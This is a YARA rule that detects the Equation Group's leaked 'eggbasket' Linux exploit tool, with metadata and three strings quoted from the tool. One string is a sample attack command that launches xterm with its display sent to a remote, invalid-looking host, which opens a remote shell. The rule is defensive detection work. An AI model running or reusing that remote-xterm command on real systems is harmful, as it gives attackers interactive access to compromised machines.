rule Trojan_Backdoor_Linux_Equation_eggbask_73_12
{
    meta:
        judge = "black"
        threatname = "Trojan[Backdoor]/Linux.Equation.eggbask"
        threattype = "Backdoor"
        family = "Equation"
        hacker = "None"
        author = "Florian Roth-copy"
        refer = "42f60b4df41713f927026baddf57271c"
        comment = "APT Equation Grou-https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
        date = "2018-07-09"
        description = "Equation Group hack tool leaked by ShadowBrokers- file eggbasket"
	strings:
		$x1 = "# Building Shellcode into exploit." fullword ascii
		$x2 = "%s -w /index.html -v 3.5 -t 10 -c \"/usr/openwin/bin/xterm -d 555.1.2.2:0&\"  -d 10.0.0.1 -p 80" fullword ascii
		$x3 = "# STARTING EXHAUSTIVE ATTACK AGAINST " fullword ascii
	condition:
		( uint16(0) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )
}